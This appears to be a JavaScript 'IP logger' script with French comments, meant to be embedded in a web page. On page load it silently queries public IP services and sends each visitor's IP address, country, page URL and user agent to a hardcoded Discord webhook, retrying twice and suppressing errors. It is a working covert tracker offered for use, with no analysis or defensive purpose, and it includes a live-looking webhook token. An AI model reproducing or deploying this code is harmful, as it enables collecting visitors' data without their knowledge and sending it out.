// =============================================
// ULTRABOT IP LOGGER v10 - IP FORCÉE
// =============================================

const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz";

async function getIPAndSend() {
    let ipInfo = { ip: "❌ Non récupérée", country: "Inconnu" };

    const urls = [
        "https://api.ipify.org?format=json",
        "https://api.my-ip.io/ip.json",
        "https://freeipapi.com/api/json",
        "https://ipapi.co/json/"
    ];

    for (let url of urls) {
        try {
            const res = await fetch(url, { 
                method: 'GET',
                cache: 'no-cache'
            });
            
            if (res.ok) {
                const data = await res.json();
                ipInfo.ip = data.ip || data.address || data.query || "Inconnu";
                ipInfo.country = data.country_name || data.country || data.cc || "Inconnu";
                console.log("%c[UltraBot] IP récupérée avec succès", "color: lime");
                break;
            }
        } catch (e) {}
    }

    const message = `**🔴 Nouveau visiteur UltraBot**\n` +
                    `**IP :** \`${ipInfo.ip}\`\n` +
                    `**Pays :** ${ipInfo.country}\n` +
                    `**Heure :** ${new Date().toLocaleString('fr-FR')}\n` +
                    `**Page :** ${window.location.href}\n` +
                    `**User-Agent :** ${navigator.userAgent.substring(0, 100)}...`;

    // Envoi principal
    fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
    }).catch(() => {});

    // Beacon backup
    try {
        navigator.sendBeacon(WEBHOOK, JSON.stringify({ content: message }));
        console.log("%c[UltraBot] ✅ Envoi complet (avec IP)", "color: lime");
    } catch (e) {}
}

// Lancement
window.addEventListener('load', () => {
    console.log("%c[UltraBot] IP Logger v10 chargé", "color: red; font-weight: bold");
    setTimeout(getIPAndSend, 800);
    setTimeout(getIPAndSend, 2500);
});
